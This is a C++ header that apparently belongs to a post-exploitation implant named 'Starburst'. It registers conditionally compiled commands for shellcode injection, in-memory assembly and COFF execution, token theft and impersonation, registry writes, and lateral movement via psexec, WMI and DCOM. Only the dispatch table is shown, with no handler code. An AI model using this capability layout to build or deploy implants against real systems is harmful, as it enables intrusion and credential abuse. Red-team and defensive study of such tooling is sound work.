#ifndef STARBURST_COMMAND_TABLE_H
#define STARBURST_COMMAND_TABLE_H

#include <config.h>
#include <commands.h>
#include <module.h>

/*
 * Static command registration table.
 *
 * To add a new command:
 *   1. Define CMD_<NAME> id in config.h
 *   2. Create src/commands/cmd_<name>.cc (guard with #ifdef INCLUDE_CMD_<NAME>)
 *   3. Add handler declaration to commands.h
 *   4. Add CMD_REG_<NAME> entry below
 *   5. Add CMD_REG_<NAME> to COMMAND_TABLE_ENTRIES
 */

namespace starburst {

#ifdef INCLUDE_CMD_EXIT
  #define CMD_REG_EXIT    { CMD_EXIT, cmd_exit },
#else
  #define CMD_REG_EXIT
#endif

#ifdef INCLUDE_CMD_SLEEP
  #define CMD_REG_SLEEP   { CMD_SLEEP, cmd_sleep },
#else
  #define CMD_REG_SLEEP
#endif

#ifdef INCLUDE_CMD_SHELL
  #define CMD_REG_SHELL   { CMD_SHELL, cmd_shell },
#else
  #define CMD_REG_SHELL
#endif

#ifdef INCLUDE_CMD_WHOAMI
  #define CMD_REG_WHOAMI  { CMD_WHOAMI, cmd_whoami },
#else
  #define CMD_REG_WHOAMI
#endif

#ifdef INCLUDE_CMD_PWD
  #define CMD_REG_PWD     { CMD_PWD, cmd_pwd },
#else
  #define CMD_REG_PWD
#endif

#ifdef INCLUDE_CMD_CD
  #define CMD_REG_CD      { CMD_CD, cmd_cd },
#else
  #define CMD_REG_CD
#endif

#ifdef INCLUDE_CMD_LS
  #define CMD_REG_LS      { CMD_LS, cmd_ls },
#else
  #define CMD_REG_LS
#endif

#ifdef INCLUDE_CMD_PS
  #define CMD_REG_PS      { CMD_PS, cmd_ps },
#else
  #define CMD_REG_PS
#endif

#ifdef INCLUDE_CMD_CONFIG
  #define CMD_REG_CONFIG  { CMD_CONFIG, cmd_config },
#else
  #define CMD_REG_CONFIG
#endif

#ifdef INCLUDE_CMD_UPLOAD
  #define CMD_REG_UPLOAD  { CMD_UPLOAD, cmd_upload },
#else
  #define CMD_REG_UPLOAD
#endif

#ifdef INCLUDE_CMD_DOWNLOAD
  #define CMD_REG_DOWNLOAD { CMD_DOWNLOAD, cmd_download },
#else
  #define CMD_REG_DOWNLOAD
#endif

#ifdef INCLUDE_CMD_SHINJECT
  #define CMD_REG_SHINJECT { CMD_SHINJECT, cmd_shinject },
#else
  #define CMD_REG_SHINJECT
#endif

#ifdef INCLUDE_CMD_EXECUTE_PIC
  #define CMD_REG_EXECUTE_PIC { CMD_EXECUTE_PIC, cmd_execute_pic },
#else
  #define CMD_REG_EXECUTE_PIC
#endif

#ifdef INCLUDE_CMD_CAT
  #define CMD_REG_CAT { CMD_CAT, cmd_cat },
#else
  #define CMD_REG_CAT
#endif

#ifdef INCLUDE_CMD_MKDIR
  #define CMD_REG_MKDIR { CMD_MKDIR, cmd_mkdir },
#else
  #define CMD_REG_MKDIR
#endif

#ifdef INCLUDE_CMD_RM
  #define CMD_REG_RM { CMD_RM, cmd_rm },
#else
  #define CMD_REG_RM
#endif

#ifdef INCLUDE_CMD_CP
  #define CMD_REG_CP { CMD_CP, cmd_cp },
#else
  #define CMD_REG_CP
#endif

#ifdef INCLUDE_CMD_MV
  #define CMD_REG_MV { CMD_MV, cmd_mv },
#else
  #define CMD_REG_MV
#endif

#ifdef INCLUDE_CMD_ENV
  #define CMD_REG_ENV { CMD_ENV, cmd_env },
#else
  #define CMD_REG_ENV
#endif

#ifdef INCLUDE_CMD_REG_QUERY
  #define CMD_REG_REG_QUERY { CMD_REG_QUERY, cmd_reg_query },
#else
  #define CMD_REG_REG_QUERY
#endif

#ifdef INCLUDE_CMD_SCREENSHOT
  #define CMD_REG_SCREENSHOT { CMD_SCREENSHOT, cmd_screenshot },
#else
  #define CMD_REG_SCREENSHOT
#endif

#ifdef INCLUDE_CMD_TOKEN_LIST
  #define CMD_REG_TOKEN_LIST { CMD_TOKEN_LIST, cmd_token_list },
#else
  #define CMD_REG_TOKEN_LIST
#endif

#ifdef INCLUDE_CMD_EXECUTE_ASSEMBLY
  #define CMD_REG_EXECUTE_ASSEMBLY { CMD_EXECUTE_ASSEMBLY, cmd_execute_assembly },
#else
  #define CMD_REG_EXECUTE_ASSEMBLY
#endif

#ifdef INCLUDE_CMD_EXECUTE_COFF
  #define CMD_REG_EXECUTE_COFF { CMD_EXECUTE_COFF, cmd_execute_coff },
#else
  #define CMD_REG_EXECUTE_COFF
#endif

#ifdef INCLUDE_CMD_JUMP_PSEXEC
  #define CMD_REG_JUMP_PSEXEC { CMD_JUMP_PSEXEC, cmd_jump_psexec },
#else
  #define CMD_REG_JUMP_PSEXEC
#endif

#ifdef INCLUDE_CMD_JUMP_SCSHELL
  #define CMD_REG_JUMP_SCSHELL { CMD_JUMP_SCSHELL, cmd_jump_scshell },
#else
  #define CMD_REG_JUMP_SCSHELL
#endif

#ifdef INCLUDE_CMD_JUMP_WMIEXEC
  #define CMD_REG_JUMP_WMIEXEC { CMD_JUMP_WMIEXEC, cmd_jump_wmiexec },
#else
  #define CMD_REG_JUMP_WMIEXEC
#endif

#ifdef INCLUDE_CMD_JUMP_DCOMEXEC
  #define CMD_REG_JUMP_DCOMEXEC { CMD_JUMP_DCOMEXEC, cmd_jump_dcomexec },
#else
  #define CMD_REG_JUMP_DCOMEXEC
#endif

#ifdef INCLUDE_CMD_IFCONFIG
  #define CMD_REG_IFCONFIG { CMD_IFCONFIG, cmd_ifconfig },
#else
  #define CMD_REG_IFCONFIG
#endif

#ifdef INCLUDE_CMD_NETSTAT
  #define CMD_REG_NETSTAT { CMD_NETSTAT, cmd_netstat },
#else
  #define CMD_REG_NETSTAT
#endif

#ifdef INCLUDE_CMD_KILL
  #define CMD_REG_KILL { CMD_KILL, cmd_kill },
#else
  #define CMD_REG_KILL
#endif

#ifdef INCLUDE_CMD_RUN
  #define CMD_REG_RUN { CMD_RUN, cmd_run },
#else
  #define CMD_REG_RUN
#endif

#ifdef INCLUDE_CMD_GETPRIVS
  #define CMD_REG_GETPRIVS { CMD_GETPRIVS, cmd_getprivs },
#else
  #define CMD_REG_GETPRIVS
#endif

#ifdef INCLUDE_CMD_LISTPIPES
  #define CMD_REG_LISTPIPES { CMD_LISTPIPES, cmd_listpipes },
#else
  #define CMD_REG_LISTPIPES
#endif

#ifdef INCLUDE_CMD_REG_WRITE_VALUE
  #define CMD_REG_REG_WRITE_VALUE { CMD_REG_WRITE_VALUE, cmd_reg_write_value },
#else
  #define CMD_REG_REG_WRITE_VALUE
#endif

#ifdef INCLUDE_CMD_MAKE_TOKEN
  #define CMD_REG_MAKE_TOKEN { CMD_MAKE_TOKEN, cmd_make_token },
#else
  #define CMD_REG_MAKE_TOKEN
#endif

#ifdef INCLUDE_CMD_STEAL_TOKEN
  #define CMD_REG_STEAL_TOKEN { CMD_STEAL_TOKEN, cmd_steal_token },
#else
  #define CMD_REG_STEAL_TOKEN
#endif

#ifdef INCLUDE_CMD_REV2SELF
  #define CMD_REG_REV2SELF { CMD_REV2SELF, cmd_rev2self },
#else
  #define CMD_REG_REV2SELF
#endif

#ifdef INCLUDE_CMD_NET_LOCALGROUP
  #define CMD_REG_NET_LOCALGROUP { CMD_NET_LOCALGROUP, cmd_net_localgroup },
#else
  #define CMD_REG_NET_LOCALGROUP
#endif

#ifdef INCLUDE_CMD_NET_LOCALGROUP_MEMBER
  #define CMD_REG_NET_LOCALGROUP_MEMBER { CMD_NET_LOCALGROUP_MEMBER, cmd_net_localgroup_member },
#else
  #define CMD_REG_NET_LOCALGROUP_MEMBER
#endif

#ifdef INCLUDE_CMD_POWERPICK
  #define CMD_REG_POWERPICK { CMD_POWERPICK, cmd_powerpick },
#else
  #define CMD_REG_POWERPICK
#endif

#ifdef INCLUDE_CMD_SPAWNTO_X64
  #define CMD_REG_SPAWNTO_X64 { CMD_SPAWNTO_X64, cmd_spawnto_x64 },
#else
  #define CMD_REG_SPAWNTO_X64
#endif

#ifdef INCLUDE_CMD_SPAWNTO_X86
  #define CMD_REG_SPAWNTO_X86 { CMD_SPAWNTO_X86, cmd_spawnto_x86 },
#else
  #define CMD_REG_SPAWNTO_X86
#endif

#ifdef INCLUDE_CMD_SPAWN
  #define CMD_REG_SPAWN { CMD_SPAWN, cmd_spawn },
#else
  #define CMD_REG_SPAWN
#endif

#define COMMAND_TABLE_ENTRIES \
    CMD_REG_EXIT              \
    CMD_REG_SLEEP             \
    CMD_REG_SHELL             \
    CMD_REG_WHOAMI            \
    CMD_REG_PWD               \
    CMD_REG_CD                \
    CMD_REG_LS                \
    CMD_REG_PS                \
    CMD_REG_CONFIG            \
    CMD_REG_UPLOAD            \
    CMD_REG_DOWNLOAD          \
    CMD_REG_SHINJECT          \
    CMD_REG_EXECUTE_PIC       \
    CMD_REG_CAT               \
    CMD_REG_MKDIR             \
    CMD_REG_RM                \
    CMD_REG_CP                \
    CMD_REG_MV                \
    CMD_REG_ENV               \
    CMD_REG_REG_QUERY         \
    CMD_REG_SCREENSHOT        \
    CMD_REG_TOKEN_LIST        \
    CMD_REG_EXECUTE_ASSEMBLY  \
    CMD_REG_EXECUTE_COFF      \
    CMD_REG_JUMP_PSEXEC       \
    CMD_REG_JUMP_SCSHELL      \
    CMD_REG_JUMP_WMIEXEC      \
    CMD_REG_JUMP_DCOMEXEC     \
    CMD_REG_IFCONFIG          \
    CMD_REG_NETSTAT           \
    CMD_REG_KILL              \
    CMD_REG_RUN               \
    CMD_REG_GETPRIVS          \
    CMD_REG_LISTPIPES         \
    CMD_REG_REG_WRITE_VALUE   \
    CMD_REG_MAKE_TOKEN        \
    CMD_REG_STEAL_TOKEN       \
    CMD_REG_REV2SELF          \
    CMD_REG_NET_LOCALGROUP    \
    CMD_REG_NET_LOCALGROUP_MEMBER \
    CMD_REG_POWERPICK        \
    CMD_REG_SPAWNTO_X64       \
    CMD_REG_SPAWNTO_X86       \
    CMD_REG_SPAWN

}

#endif
